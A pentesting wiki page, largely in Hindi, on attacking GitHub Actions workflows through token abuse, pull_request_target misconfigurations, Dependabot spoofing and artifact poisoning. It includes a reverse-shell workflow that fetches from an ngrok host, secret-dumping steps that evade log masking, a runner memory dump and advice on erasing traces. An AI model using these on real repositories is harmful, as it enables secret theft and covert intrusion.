# Github Actions का दुरुपयोग

{{#include ../../../banners/hacktricks-training.md}}

## Tools

निम्नलिखित उपकरण Github Action workflows खोजने और यहाँ तक कि संभावित vulnerable ones पहचानने में उपयोगी हैं:

- [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
- [https://github.com/praetorian-inc/gato](https://github.com/praetorian-inc/gato)
- [https://github.com/AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)
- [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)
- [https://github.com/zizmorcore/zizmor](https://github.com/zizmorcore/zizmor) - इसकी checklist भी देखें: [https://docs.zizmor.sh/audits](https://docs.zizmor.sh/audits)

## Basic Information

इस पृष्ठ में आप पाएँगे:

- एक **सभी प्रभावों का सारांश** जब कोई attacker Github Action तक access प्राप्त कर ले
- किसी action तक **access प्राप्त करने** के विभिन्न तरीके:
  - Action बनाने के लिए **permissions** होना
  - **pull request** से जुड़े triggers का दुरुपयोग
  - अन्य **external access** तकनीकों का दुरुपयोग
  - पहले से compromised repo से **Pivoting**
- अंत में, एक सेक्शन **post-exploitation techniques** के बारे में ताकि action के अंदर से उसे abuse किया जा सके (और बताए गए प्रभाव उत्पन्न हों)

## Impacts Summary

Github Actions के परिचय के लिए [**basic information देखें**](../basic-github-information.md#github-actions).

यदि आप किसी **repository** के भीतर GitHub Actions में arbitrary code execute कर सकते हैं, तो आप संभवतः निम्न कर पाएँगे:

- **Steal secrets** mounted to the pipeline और external platforms (जैसे AWS और GCP) में unauthorized access पाने के लिए pipeline की **abuse the pipeline's privileges** कर सकते हैं।
- **Compromise deployments** और अन्य **artifacts**।
- यदि pipeline assets को deploy या store करता है, तो आप final product को बदल सकते हैं, जिससे supply chain attack संभव हो सकता है।
- **Execute code in custom workers** करके computing power का दुरुपयोग कर सकते हैं और अन्य systems की ओर pivot कर सकते हैं।
- `GITHUB_TOKEN` से जुड़ी permissions पर निर्भर करते हुए, आप **Overwrite repository code** भी कर सकते हैं।

## GITHUB_TOKEN

यह "**secret**" (जो `${{ secrets.GITHUB_TOKEN }}` और `${{ github.token }}` से आता है) तब दिया जाता है जब admin इस option को enable करता है:

<figure><img src="../../../images/image (86).png" alt=""><figcaption></figcaption></figure>

यह token वही है जिसका उपयोग एक **Github Application** करेगा, इसलिए यह वही endpoints access कर सकता है: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

> [!WARNING]
> Github को एक [**flow**](https://github.com/github/roadmap/issues/74) जारी करना चाहिए जो GitHub के भीतर **cross-repository** access की अनुमति दे, ताकि एक repo अन्य internal repos को `GITHUB_TOKEN` का उपयोग करके access कर सके।

आप इस token की संभावित **permissions** यहाँ देख सकते हैं: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

ध्यान दें कि यह token **job पूरा होने के बाद expire हो जाता है**.\
ये tokens इस तरह दिखते हैं: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

कुछ रोचक चीज़ें जो आप इस token से कर सकते हैं:

{{#tabs }}
{{#tab name="Merge PR" }}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header "content-type: application/json" \
-d "{\"commit_title\":\"commit_title\"}"
```
{{#endtab }}
{{#tab name="Approve PR" }}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{{#endtab }}
{{#tab name="Create PR" }}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{{#endtab }}
{{#endtabs }}

> [!CAUTION]
> ध्यान दें कि कई मौकों पर आप **github user tokens inside Github Actions envs or in the secrets** पा सकते हैं। ये tokens आपको repository और organization पर अधिक privileges दे सकते हैं।

<details>

<summary>Github Action output में secrets की सूची</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>secrets के साथ reverse shell प्राप्त करें</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

यह संभव है कि आप अन्य उपयोगकर्ताओं के रिपॉजिटरी में Github Token को दी गई permissions की जाँच कर सकें **checking the logs** of the actions:

<figure><img src="../../../images/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## अनुमत निष्पादन

> [!NOTE]
> यह Github actions को compromise करने का सबसे आसान तरीका होगा, क्योंकि इस केस में माना गया है कि आपके पास **create a new repo in the organization** करने की पहुँच है, या किसी रिपॉजिटरी पर **write privileges over a repository** हैं।
>
> यदि आप इस परिदृश्य में हैं तो आप बस [Post Exploitation techniques](#post-exploitation-techniques-from-inside-an-action) देख सकते हैं।

### Execution from Repo Creation

यदि किसी organization के सदस्य **create new repos** कर सकते हैं और आप github actions execute कर सकते हैं, तो आप **create a new repo and steal the secrets set at organization level** कर सकते हैं।

### Execution from a New Branch

यदि आप किसी repository में **create a new branch in a repository that already contains a Github Action** configured कर सकते हैं, तो आप इसे **modify** कर सकते हैं, content **upload** कर सकते हैं, और फिर **execute that action from the new branch** कर सकते हैं। इस तरह आप **exfiltrate repository and organization level secrets** कर सकते हैं (लेकिन आपको पता होना चाहिए कि उन्हें क्या नाम दिया गया है)।

> [!WARNING]
> यदि कोई restriction केवल workflow YAML के भीतर लागू की गई है (उदाहरण के लिए, `on: push: branches: [main]`, job conditionals, or manual gates) तो collaborators उसे edit कर सकते हैं। बाहरी प्रवर्तन (branch protections, protected environments, and protected tags) के बिना, एक contributor किसी workflow को उनके branch पर चलाने के लिए retarget कर सकता है और mounted secrets/permissions का दुरुपयोग कर सकता है।

आप modified action को **manually,** जब एक **PR is created** या जब **some code is pushed** (यह निर्भर करता है कि आप कितना noisy होना चाहते हैं) executable बना सकते हैं:
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name
# Use '**' instead of a branh name to trigger the action in all the cranches
```
---

## Forked Execution

> [!NOTE]
> विभिन्न triggers हैं जो एक हमलावर को **execute a Github Action of another repository** करने की अनुमति दे सकते हैं। यदि उन triggerable actions का configuration खराब है, तो हमलावर उन्हें compromise कर सकता है।

### `pull_request`

The workflow trigger **`pull_request`** वर्कफ़्लो को हर बार execute करेगा जब भी एक pull request प्राप्त होगा, कुछ अपवादों के साथ: डिफ़ॉल्ट रूप से अगर यह आपकी **first time** **collaborating** है, तो किसी **maintainer** को workflow के **run** को **approve** करना होगा:

<figure><img src="../../../images/image (184).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> चूँकि यह **default limitation** पहली बार योगदान करने वालों पर लागू होती है, आप एक वैध **fixing a valid bug/typo** का योगदान करके फिर अपने नए `pull_request` privileges का दुरुपयोग करने के लिए अन्य PR भेज सकते हैं।
>
> **मैंने इसे टेस्ट किया और यह काम नहीं करता**: ~~एक और विकल्प यह होगा कि किसी ऐसे व्यक्ति के नाम से एक account बनाया जाए जिसने परियोजना में योगदान दिया था और फिर उसने अपना account हटा दिया।~~

इसके अलावा, डिफ़ॉल्ट रूप से यह target repository को **prevents write permissions** और **secrets access** नहीं देता जैसा कि [**docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories) में उल्लेख है:

> With the exception of `GITHUB_TOKEN`, **secrets are not passed to the runner** when a workflow is triggered from a **forked** repository. The **`GITHUB_TOKEN` has read-only permissions** in pull requests **from forked repositories**.

एक हमलावर Github Action की definition को बदल सकता है ताकि arbitrary चीज़ें execute की जा सकें और arbitrary actions जोड़ी जा सकें। हालांकि, बताए गए सीमाओं के कारण वह secrets चुरा नहीं पाएगा या repo को overwrite नहीं कर पाएगा।

> [!CAUTION]
> **हाँ, अगर हमलावर PR में उस github action को बदल देता है जो trigger होगा, तो उसका Github Action ही उपयोग होगा न कि origin repo का!**

चूंकि हमलावर उस code को भी नियंत्रित करता है जो execute किया जा रहा है, भले ही `GITHUB_TOKEN` पर secrets या write permissions न हों, हमलावर उदाहरण के लिए **upload malicious artifacts** कर सकता है।

### **`pull_request_target`**

The workflow trigger **`pull_request_target`** को target repository पर **write permission** और **access to secrets** मिलता है (और यह permission के लिए पूछता नहीं है)।

ध्यान दें कि workflow trigger **`pull_request_target`** **base context** में चलता है और PR द्वारा दिए गए context में नहीं (ताकि **not execute untrusted code**)। `pull_request_target` के बारे में अधिक जानकारी के लिए [**check the docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target) देखें।\
इसके अलावा, इस विशिष्ट खतरनाक उपयोग के बारे में और जानकारी के लिए यह [**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) देखें।

यह ऐसा लग सकता है कि क्योंकि **executed workflow** वही है जो **base** में परिभाषित है और **not in the PR**, इसलिए **`pull_request_target`** का उपयोग करना **secure** है, पर कुछ मामलों में ऐसा नहीं होता।

और यह **access to secrets** प्राप्त कर सकेगा।

### `workflow_run`

The [**workflow_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) trigger एक workflow को किसी अन्य workflow द्वारा तब चलाने की अनुमति देता है जब वह `completed`, `requested` या `in_progress` हो।

In this example, a workflow is configured to run after the separate "Run Tests" workflow completes:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Moreover, according to the docs: The workflow started by the `workflow_run` event is able to **access secrets and write tokens, even if the previous workflow was not**.

इस तरह के workflow पर तब हमला किया जा सकता है जब यह किसी ऐसे **workflow** पर निर्भर हो जो किसी external user द्वारा **`pull_request`** या **`pull_request_target`** के ज़रिए **trigger** किया जा सकता है। कुछ vulnerable उदाहरण [**found this blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** पहला उदाहरण उस **`workflow_run`** triggered workflow का है जो attacker के code को डाउनलोड कर लेता है: `${{ github.event.pull_request.head.sha }}`\
दूसरा उदाहरण उस स्थिति का है जहाँ untrusted code से एक **artifact** को **`workflow_run`** workflow में पास किया जाता है और उस artifact की content को इस तरह इस्तेमाल किया जाता है कि वह **vulnerable to RCE** हो जाता है।

### `workflow_call`

TODO

TODO: Check if when executed from a pull_request the used/downloaded code if the one from the origin or from the forked PR

## Abusing Forked Execution

हमने उन सभी तरीकों का ज़िक् किया है जिनसे एक external attacker किसी GitHub workflow को execute करवाने में कामयाब हो सकता है, अब देखते हैं कि ये executions, अगर गलत कॉन्फ़िगर किए गए हों, तो कैसे दुरुपयोग किए जा सकते हैं:

### Untrusted checkout execution

In the case of **`pull_request`,** the workflow is going to be executed in the **context of the PR** (so it'll execute the **malicious PRs code**), but someone needs to **authorize it first** and it will run with some [limitations](#pull_request).

In case of a workflow using **`pull_request_target` or `workflow_run`** that depends on a workflow that can be triggered from **`pull_request_target` or `pull_request`** the code from the original repo will be executed, so the **attacker cannot control the executed code**.

> [!CAUTION]
> However, if the **action** has an **explicit PR checkou**t that will **get the code from the PR** (and not from base), it will use the attackers controlled code. For example (check line 12 where the PR code is downloaded):

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

The potentially **untrusted code is being run during `npm install` or `npm build`** as the build scripts and referenced **packages are controlled by the author of the PR**.

> [!WARNING]
> A github dork to search for vulnerable actions is: `event.pull_request pull_request_target extension:yml` however, there are different ways to configure the jobs to be executed securely even if the action is configured insecurely (like using conditionals about who is the actor generating the PR).

### Context Script Injections <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Note that there are certain [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) whose values are **controlled** by the **user** creating the PR. If the github action is using that **data to execute anything**, it could lead to **arbitrary code execution:**

{{#ref}}
gh-actions-context-script-injections.md
{{#endref}}

### **GITHUB_ENV Script Injection** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

From the docs: You can make an **environment variable available to any subsequent steps** in a workflow job by defining or updating the environment variable and writing this to the **`GITHUB_ENV`** environment file.

यदि कोई attacker इस **env** variable के अंदर कोई भी value **inject** कर सके, तो वह ऐसे env variables inject कर सकता है जो आगे के steps में code execute करवा सकते हैं, जैसे **LD_PRELOAD** या **NODE_OPTIONS**।

For example ([**this**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) and [**this**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), imagine a workflow that is trusting an uploaded artifact to store its content inside **`GITHUB_ENV`** env variable. An attacker could upload something like this to compromise it:

<figure><img src="../../../images/image (261).png" alt=""><figcaption></figcaption></figure>

### Dependabot and other trusted bots

As indicated in [**this blog post**](https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest), several organizations have a Github Action that merges any PRR from `dependabot[bot]` like in:
```yaml
on: pull_request_target
jobs:
auto-merge:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: gh pr merge $ -d -m
```
Which is a problem because the `github.actor` field contains the user who caused the latest event that triggered the workflow. And There are several ways to make the `dependabot[bot]` user to modify a PR. For example:

- पीड़ित repository को fork करें
- अपने कॉपी में malicious payload जोड़ें
- अपने fork पर Dependabot सक्षम करें और एक outdated dependency जोड़ें। Dependabot उस dependency को ठीक करने के लिए एक branch बनाएगा जिसमें malicious code होगा।
- उस branch से पीड़ित रिपॉज़िटरी पर एक Pull Request खोलें (the PR will be created by the user so nothing will happen yet)
- Then, attacker goes back to the initial PR Dependabot opened in his fork and runs `@dependabot recreate`
- Then, Dependabot perform some actions in that branch, that modified the PR over the victim repo, which makes `dependabot[bot]` the actor of the latest event that triggered the workflow (and therefore, the workflow runs).

Moving on, what if instead of merging the Github Action would have a command injection like in:
```yaml
on: pull_request_target
jobs:
just-printing-stuff:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: echo ${ { github.event.pull_request.head.ref }}
```
Well, the original blogpost proposes two options to abuse this behavior being the second one:

- Victim repository को fork करें और किसी outdated dependency के साथ Dependabot सक्षम करें।
- एक नया branch बनाएं जिसमें malicious shell injection code हो।
- Repo का default branch उस branch पर बदल दें।
- इस branch से victim repository में एक PR बनाएं।
- PR में जो Dependabot ने उसके fork में खोला है, वहां `@dependabot merge` चलाएं।
- Dependabot उसके forked repository के default branch में उनके changes को merge कर देगा, victim repository में PR को अपडेट करेगा, जिससे अब `dependabot[bot]` उस latest event का actor होगा जिसने workflow को trigger किया और malicious branch name का उपयोग किया जा रहा होगा।

### Vulnerable Third Party Github Actions

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

जैसा कि [**this blog post**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks) में बताया गया है, यह Github Action अलग-अलग workflows और यहाँ तक कि अन्य repositories से artifacts तक access करने की अनुमति देता है।

समस्या यह है कि अगर **`path`** parameter सेट नहीं है, तो artifact वर्तमान directory में extract हो जाता है और यह उन फ़ाइलों को override कर सकता है जिन्हें बाद में workflow में उपयोग या execute किया जा सकता है। इसलिए, अगर Artifact vulnerable है, तो एक attacker इसका दुरुपयोग कर के उन अन्य workflows को compromise कर सकता है जो उस Artifact पर भरोसा करते हैं।

Example of vulnerable workflow:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
इसे इस workflow से हमला किया जा सकता है:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
---

## अन्य External Access

### Deleted Namespace Repo Hijacking

अगर किसी account ने अपना नाम बदल दिया है तो कुछ समय बाद कोई अन्य user उसी नाम के साथ एक account रजिस्टर कर सकता है। अगर किसी repository के पास नाम बदलने से पहले **less than 100 stars previously to the change of nam**e थे, Github नए रजिस्टर किए गए user को उसी नाम से वही **repository with the same name** बनाने की अनुमति दे देगा जो हटाई गई थी।

> [!CAUTION]
> तो अगर कोई action किसी non-existent account के repo का उपयोग कर रहा है, तो attacker उस account को बना कर action को compromise कर सकता है।

अगर अन्य repositories इस user के repos से **dependencies from this user repos** इस्तेमाल कर रहे थे, तो attacker उन्हें hijack कर पाएगा। यहाँ एक अधिक विस्तृत व्याख्या है: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

---

## Repo Pivoting

> [!NOTE]
> इस सेक्शन में हम उन techniques के बारे में बात करेंगे जो हमें यह अनुमति देंगी कि हम **pivot from one repo to another** — मान लेते हैं कि हमारे पास पहले repo पर कुछ तरह की access है (पिछले सेक्शन देखें)।

### Cache Poisoning

एक cache को वही branch में चल रहे **wokflow runs in the same branch** के बीच में रखा जाता है। इसका मतलब है कि अगर कोई attacker किसी **package** को compromise कर देता है, जो बाद में cache में store हो जाता है और किसी **more privileged** workflow द्वारा **downloaded** और execute किया जाता है, तो वह उस workflow को भी **compromise** कर सकेगा।

{{#ref}}
gh-actions-cache-poisoning.md
{{#endref}}

### Artifact Poisoning

Workflows अन्य workflows और यहाँ तक कि repos से भी **artifacts from other workflows and even repos** का उपयोग कर सकते हैं; अगर कोई attacker उस Github Action को **compromise** कर ले जो **uploads an artifact** और वह artifact बाद में किसी अन्य workflow द्वारा उपयोग किया जाता है, तो वह अन्य workflows को भी **compromise** कर सकता है:

{{#ref}}
gh-actions-artifact-poisoning.md
{{#endref}}

---

## Post Exploitation from an Action

### Github Action Policies Bypass

जैसा कि [**this blog post**](https://blog.yossarian.net/2025/06/11/github-actions-policies-dumb-bypass) में बताया गया है, भले ही किसी repository या organization के पास कुछ actions के उपयोग को सीमित करने वाली policy हो, एक attacker बस workflow के अंदर किसी action को डाउनलोड (`git clone`) कर सकता है और फिर उसे local action के रूप में reference कर सकता है। चूँकि policies local paths को प्रभावित नहीं करतीं, **action बिना किसी restriction के execute हो जाएगा।**

Example:
```yaml
on: [push, pull_request]

jobs:
test:
runs-on: ubuntu-latest
steps:
- run: |
mkdir -p ./tmp
git clone https://github.com/actions/checkout.git ./tmp/checkout

- uses: ./tmp/checkout
with:
repository: woodruffw/gha-hazmat
path: gha-hazmat

- run: ls && pwd

- run: ls tmp/checkout
```
### OIDC के माध्यम से AWS और GCP तक पहुँच

निम्न पृष्ठ देखें:

{{#ref}}
../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md
{{#endref}}

{{#ref}}
../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md
{{#endref}}

### secrets तक पहुँच <a href="#accessing-secrets" id="accessing-secrets"></a>

यदि आप किसी script में content inject कर रहे हैं तो यह जानना उपयोगी है कि आप secrets तक कैसे पहुँच सकते हैं:

- यदि secret या token को एक **environment variable** में सेट किया गया है, तो इसे सीधे environment के माध्यम से **`printenv`** का उपयोग करके access किया जा सकता है।

<details>

<summary>Github Action output में secrets सूचीबद्ध करें</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>secrets के साथ reverse shell प्राप्त करें</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

- यदि secret का उपयोग **directly in an expression** किया जाता है, तो generated shell script **on-disk** पर स्टोर होता है और उपलब्ध रहता है।
- ```bash
cat /home/runner/work/_temp/*
```
- JavaScript actions के लिए secrets environment variables के माध्यम से भेजे जाते हैं
- ```bash
ps axe | grep node
```
- एक **custom action** के लिए, जोखिम इस बात पर निर्भर कर सकता है कि कोई program उस **secret** का उपयोग कैसे कर रहा है जो उसे **argument** से मिला है:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

- secrets context (collaborator level) के माध्यम से सभी secrets को enumerate करें। write access वाला contributor किसी भी branch पर workflow को modify करके सभी repository/org/environment secrets को dump कर सकता है। GitHub के log masking से बचने के लिए double base64 का उपयोग करें और लोकल रूप से decode करें:

```yaml
name: Steal secrets
on:
push:
branches: [ attacker-branch ]
jobs:
dump:
runs-on: ubuntu-latest
steps:
- name: Double-base64 the secrets context
run: |
echo '${{ toJson(secrets) }}' | base64 -w0 | base64 -w0
```

लोकल रूप से decode करें:

```bash
echo "ZXdv...Zz09" | base64 -d | base64 -d
```

टिप: परीक्षण के दौरान stealth के लिए, printing से पहले encrypt करें (openssl पहले से GitHub-hosted runners पर preinstalled है)।

### Self-hosted runners का दुरुपयोग

यह पता लगाने का तरीका कि कौन से **Github Actions are being executed in non-github infrastructure**, वह Github Action configuration yaml में **`runs-on: self-hosted`** को search करना है।

**Self-hosted** runners को **extra sensitive information**, अन्य **network systems** (नेटवर्क में vulnerable endpoints? metadata service?) तक access मिल सकता है, या, भले ही यह isolated हो और destroy कर दिया जाए, **more than one action might be run at the same time** और malicious action दूसरे का **secrets** चुरा सकता है।

Self-hosted runners में मेमोरी dump करके **secrets from the \_Runner.Listener**\_\*\* process\*\* प्राप्त करना भी संभव है, यह process किसी भी step पर workflows के सभी secrets को रखेगा:
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
जानकारी के लिए [**इस पोस्ट को देखें**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

यह संभव है कि Github actions बनाए जा सकें जो **Github के अंदर एक Docker image बनाकर स्टोर करें**.\\
निम्न विस्तार योग्य सेक्शन में एक उदाहरण दिया गया है:

<details>

<summary>Github Action Build & Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

जैसा कि आप पिछले कोड में देख सकते हैं, Github registry **`ghcr.io`** पर होस्ट है।

repo पर read permissions वाले एक user तब personal access token का उपयोग करके Docker Image डाउनलोड कर सकेगा:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Then, the user could search for **leaked secrets in the Docker image layers:**

{{#ref}}
https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics.html
{{#endref}}

### Github Actions logs में संवेदनशील जानकारी

भले ही **Github** actions लॉग्स में **detect secret values** और उन्हें **avoid showing** करने की कोशिश करे, action के निष्पादन के दौरान उत्पन्न हुई **other sensitive data** छिपायी नहीं जाएगी। उदाहरण के लिए, एक JWT जो किसी secret value से साइन किया गया है वह तब तक छिपाया नहीं जाएगा जब तक कि वह [specifically configured](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret) न हो।

## अपने निशान छुपाना

(Technique from [**here**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) सबसे पहले, कोई भी PR जो उठाया गया है वह GitHub पर और टार्गेट GitHub अकाउंट पर सार्वजनिक रूप से दिखाई देता है। GitHub में डिफ़ॉल्ट रूप से, हम **can’t delete a PR of the internet**, पर एक ट्विस्ट है। जिन Github accounts को Github द्वारा **suspended** किया जाता है, उनके सभी **PRs are automatically deleted** और इंटरनेट से हटा दिए जाते हैं। इसलिए अपनी activity छुपाने के लिए आपको या तो अपना **GitHub account suspended or get your account flagged** कराना होगा। इससे GitHub पर आपकी **hide all your activities** इंटरनेट से छिप जाएँगी (बुनियादी रूप से आपके सभी exploit PR हट जाएँगे)।

GitHub में एक organization अकाउंट्स को रिपोर्ट करने में बहुत proactive होती है। आपको बस Issue में "some stuff" शेयर करना होगा और वे सुनिश्चित कर देंगे कि आपका अकाउंट 12 hours में suspended हो जाए :p और बस, आपकी exploit GitHub पर invisible हो जाएगी।

> [!WARNING]
> किसी organization के लिए यह पता लगाने का единमात्र तरीका यह होगा कि वे SIEM से GitHub logs चेक करें क्योंकि GitHub UI से PR हटा दिया जाएगा।

## संदर्भ

- [GitHub Actions: A Cloudy Day for Security - Part 1](https://binarysecurity.no/posts/2025/08/securing-gh-actions-part1)

{{#include ../../../banners/hacktricks-training.md}}
